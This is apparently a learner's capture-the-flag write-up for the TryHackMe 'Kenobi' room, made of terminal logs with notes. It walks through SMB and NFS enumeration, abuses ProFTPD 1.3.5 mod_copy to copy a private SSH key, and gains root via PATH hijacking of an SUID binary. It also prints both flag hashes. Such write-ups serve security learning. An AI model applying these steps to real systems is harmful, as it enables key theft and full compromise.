### 1 ###
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ nmap -sC -sV 10.10.5.175                                                                                  255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 12:44 EST
Nmap scan report for 10.10.5.175
Host is up (0.023s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38581/tcp6  mountd
|   100005  1,2,3      43838/udp   mountd
|   100005  1,2,3      56257/tcp   mountd
|   100005  1,2,3      60652/udp6  mountd  
|   100021  1,3,4      32927/udp6  nlockmgr
|   100021  1,3,4      33961/tcp6  nlockmgr
|   100021  1,3,4      38984/udp   nlockmgr
|   100021  1,3,4      40601/tcp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-01-30T11:44:51-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02: 
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-01-30T17:44:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds










### 2 ###
# as can be seen, samba is the Windows interoperable suite which is used for Linux/Unix - allowing for filesharing
# next is therefore to do a more specific scan of port 445:

kali㉿kali)-[~/THM/practice/kenobi]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.5.175                                   255 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 12:50 EST
Nmap scan report for 10.10.5.175
Host is up (0.019s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.5.175\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.5.175\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.5.175\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 3.23 seconds


# next up is to acces the shares using smbclient:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ smbclient //10.10.5.175/anonymous                                                                         130 ⨯
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \>

# only file I could see in the current directory was log.txt
# for the purposes of being able to look back at this writeup later I used 'get log.txt' to download the log file to the same directory as this file
# another way to do it is using smbget (but as shown I had already downloaded the file):
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ smbget -R smb://10.10.5.175/anonymous
Password for [kali] connecting to //anonymous/10.10.5.175:
Using workgroup WORKGROUP, user kali
Can't open log.txt: File exists
Failed to download /log.txt: File exists

# reading through the logfile (and the THM room) there are a couple interesting things:
#1. info generated for Kenobi when generating an SSH key for user
#2. info about the ProFTPD server:
┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ cat log.txt                                                                                                 1 ⨯
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

- This is a basic ProFTPD configuration file (rename it to
- 'proftpd.conf' for actual use.  It establishes a single server
- and a single anonymous login.  It assumes that you have a user/group
- "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on


# port 111 is for RPC service - rpcbind (converts remote procedure call (RPC) pogram numbers into universal addresses
# when an RPC service is started it tells rpcbind the address its listening + RPC prog. number its being prepped to serve
# in this case port 111 is access to a network file system.
# Hence, next job is therefore to enumerate this:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.5.175                                            1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-30 13:10 EST
Nmap scan report for 10.10.5.175
Host is up (0.019s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

# the mount found is the /var --> what is a mount?
        # according to https://www.geeksforgeeks.org/mount-command-in-linux-with-examples/ its the 'location' on the hierarchy of where the file is located - where its attached to
        # "attaching an additional filesystem  to the currently accessible filesystem of a computer"
# I think in this case it means that the rpcbind is attached to samba










### 3 ###
# next challenge will be to get some form of access
# by using ProFtpd:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ nc 10.10.5.175 21                                                                                     148 ⨯ 1 ⚙
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.5.175]

# ^ is how to make a connection with the FTP port, but is not enough to gain access
# HOWEVER, now that we know the version of the FTP server is 1.3.5, next step is therefore to find an exploit using searchsploit:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ searchsploit -p 21                                                                                      2 ⨯ 1 ⚙
  Exploit: Qpopper 4.0.x - 'poppassd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/21
     Path: /usr/share/exploitdb/exploits/linux/local/21.c
File Type: C source, ASCII text, with CRLF line terminators


┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ searchsploit -p 111                                                                                         1 ⚙
  Exploit: Microsoft Windows Messenger Service - Denial of Service (MS03-043)
      URL: https://www.exploit-db.com/exploits/111
     Path: /usr/share/exploitdb/exploits/windows/dos/111.c
File Type: C source, ASCII text, with CRLF line terminators

# I was not sure how to search or run the command so did the following 2, but neither seemed to give me the correct answer for the room, so I tried this instead:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ searchsploit ProFTPd                                                                                        1 ⚙
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
FreeBSD - 'ftpd / ProFTPd' Remote Command Execution                               | freebsd/remote/18181.txt
ProFTPd - 'ftpdctl' 'pr_ctrls_connect' Local Overflow                             | linux/local/394.c
ProFTPd - 'mod_mysql' Authentication Bypass                                       | multiple/remote/8037.txt
ProFTPd - 'mod_sftp' Integer Overflow Denial of Service (PoC)                     | linux/dos/16129.txt 
ProFTPd 1.2 - 'SIZE' Remote Denial of Service                                     | linux/dos/20536.java
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)      | linux/remote/16852.rb
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (1)                 | linux/remote/19475.c
ProFTPd 1.2 pre1/pre2/pre3/pre4/pre5 - Remote Buffer Overflow (2)                 | linux/remote/19476.c
ProFTPd 1.2 pre6 - 'snprintf' Remote Root                                         | linux/remote/19503.txt
ProFTPd 1.2.0 pre10 - Remote Denial of Service                                    | linux/dos/244.java  
ProFTPd 1.2.0 rc2 - Memory Leakage                                                | linux/dos/241.c
ProFTPd 1.2.10 - Remote Users Enumeration                                         | linux/remote/581.c
ProFTPd 1.2.7 < 1.2.9rc2 - Remote Code Execution / Brute Force                    | linux/remote/110.c
ProFTPd 1.2.7/1.2.8 - '.ASCII' File Transfer Buffer Overrun                       | linux/dos/23170.c
ProFTPd 1.2.9 RC1 - 'mod_sql' SQL Injection                                       | linux/remote/43.pl
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (1)                       | linux/remote/107.c
ProFTPd 1.2.9 rc2 - '.ASCII' File Remote Code Execution (2)                       | linux/remote/3021.txt
ProFTPd 1.2.x - 'STAT' Denial of Service                                          | linux/dos/22079.sh
ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection                                  | multiple/remote/32798.pl
ProFTPd 1.3.0 (OpenSUSE) - 'mod_ctrls' Local Stack Overflow                       | unix/local/10044.pl
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                     | linux/remote/2856.pm
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (1)            | linux/local/3330.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (2)            | linux/local/3333.pl
ProFTPd 1.3.0/1.3.0a - 'mod_ctrls' exec-shield Local Overflow                     | linux/local/3730.txt
ProFTPd 1.3.0a - 'mod_ctrls' 'support' Local Buffer Overflow (PoC)                | linux/dos/2928.py
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)    | linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)      | linux/remote/16851.rb
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                | linux/remote/15662.txt
#ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                         | linux/remote/37262.rb
#ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                               | linux/remote/36803.py
#ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                           | linux/remote/49908.py
#ProFTPd 1.3.5 - File Copy                                                         | linux/remote/36742.txt
ProFTPD 1.3.7a - Remote Denial of Service                                         | multiple/dos/49697.py
ProFTPd 1.x - 'mod_tls' Remote Buffer Overflow                                    | linux/remote/4312.c
ProFTPd IAC 1.3.x - Remote Command Execution                                      | linux/remote/15449.pl
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                          | linux/remote/16921.rb
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buff | linux/remote/19086.c
WU-FTPD 2.4.2 / SCO Open Server 5.0.5 / ProFTPd 1.2 pre1 - 'realpath' Remote Buff | linux/remote/19087.c
WU-FTPD 2.4/2.5/2.6 / Trolltech ftpd 1.2 / ProFTPd 1.2 / BeroFTPD 1.3.4 FTP - glo | linux/remote/20690.sh
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# the above method worked, but showed too many results - I have commented out the ones for the version we recognised
# to check I tried running the following code instead to see if I could do a more precise search:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ searchsploit ProFTPd 1.3.5                                                                                  1 ⚙
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                               | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                           | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                         | linux/remote/36742.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

# much better
# the exploits we have found are from this module http://www.proftpd.org/docs/contrib/mod_copy.html
        # its basically an exploit which when used right allows us to copy files/directories from on place to another on the server - without having to transfer to/from the client
        # its contained in the mod_copy.c file - not compiled by default

# now; we know the service is running as the user 'Kenobi', and an ssh key is generated for this user
# therefore, next step is to copy Kenobi's private key using the found exploit (SITE CPFR/SITE CPTO) commands [copy-from/copy-to]
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ nc 10.10.5.175 21                                                                                           1 ⚙
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.5.175]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

# it was found earlier that /var was mounted so that we could see it, so by moving Kenobi's private key to the /var/tmp directory it should be possible to see it!
# way to access it = mount /var/tmp to THIS machine:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ sudo mkdir /mnt/kenobiNFS                                                                             148 ⨯ 2 ⚙
[sudo] password for kali: 

┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ mount 10.10.5.175:/var /mnt/kenobiNFS                                                                       2 ⚙
mount.nfs: failed to apply fstab options


┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ sudo !!                                                                                                32 ⨯ 2 ⚙
                                                                                                                    
┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ sudo mount 10.10.5.175:/var /mnt/kenobiNFS                                                             32 ⨯ 2 ⚙
                                                                                                                    
┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ ls -la /mnt/kenobiNFS                                                                                       2 ⚙
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Jan 30 13:31 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Jan 30 13:29 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www

# its not possible to see after its been copied here, but the tmp directory is green, meaning we have access to it!
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ cd /mnt/kenobiNFS/tmp                                                                                       2 ⚙
                                                                                                                    
┌──(kali㉿kali)-[/mnt/kenobiNFS/tmp]
└─$ ls                                                                                                          2 ⚙
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-b9f9316390df43dfb0dadabbf522e90c-systemd-timesyncd.service-opcNp7
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn

# as shown above, the id_rsa file is in there, meaning we have access to the private key
# proceed to copy the key into the same directory as this file:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .                                                                              2 ⚙

┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ ls                                                                                                          2 ⚙
id_rsa  log.txt  notes.txt

# final step to gain initial access is therefore to ssh our way in:
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ chmod 600 id_rsa                                                                                      130 ⨯ 2 ⚙
                                                                                                                    
┌──(kali㉿kali)-[~/THM/practice/kenobi]
└─$ ssh -i id_rsa kenobi@10.10.5.175                                                                            2 ⚙
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$

# AND WERE IN!
# i had a look around and found the user.txt file-flag:
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899  










### 4 ###
# the privilege escalation bit includes Path Variable Manipulation which I think I had tried once before:
        # I believe I remember it includes a file/directory which is set with the SUID bit, and then by changing the PATH variable (echo $PATH) we can read files we originally did not have access to
# frst step is to find any files with the SUID bit:
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo  
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6

# the /usr/bin/menu looked out of the ordinary, as this is not one of the 'standard' directories
# running the binary we are prompted with a menu - this screams binary buffer overflow to me:
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

# entering 200 a's only led to an 'invalid choice' error message:
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>

 Invalid choice

# the 3 options returned the following:
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 30 Jan 2022 18:47:35 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:62:f9:35:d5:f9
          inet addr:10.10.5.175  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::62:f9ff:fe35:d5f9/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:7100 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5797 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:954003 (954.0 KB)  TX bytes:1393603 (1.3 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:198 errors:0 dropped:0 overruns:0 frame:0
          TX packets:198 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:14581 (14.5 KB)  TX bytes:14581 (14.5 KB)
# and it seems its the commands: [1] curl -I localhost [2] uname -r [3] ifconfig
# this shows the binary is running ithout a full path, so as expected, this means its possible for us to 'poison/manipulate' the path:
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

#weve gotten a root shell:)
# essentially what happened, is when the 1st command 'curl' is called, rather than calling the actual curl command, its calling our '/bin/sh' command with SUID permissions - as we manipulated the path to rather use the one from our current directory
        # the shell will have root privileges due to the SUID bit set
		# path manipulation = put the location of the 'curl' command  (aka /bin/sh) to our current location (/tmp)
        # binary therefore ran /tmp/curl (/bin/sh) instead of the actual curl command!
# to get the final flag I did the following:


# pwd
/tmp
# ls
curl  systemd-private-b9f9316390df43dfb0dadabbf522e90c-systemd-timesyncd.service-er3rzA
# cd ..
# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
# cd root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02

# this was a fun one and I felt really good being able to do it without looking at a writeup + recognising and understanding path manipulation after only having done it once before! :))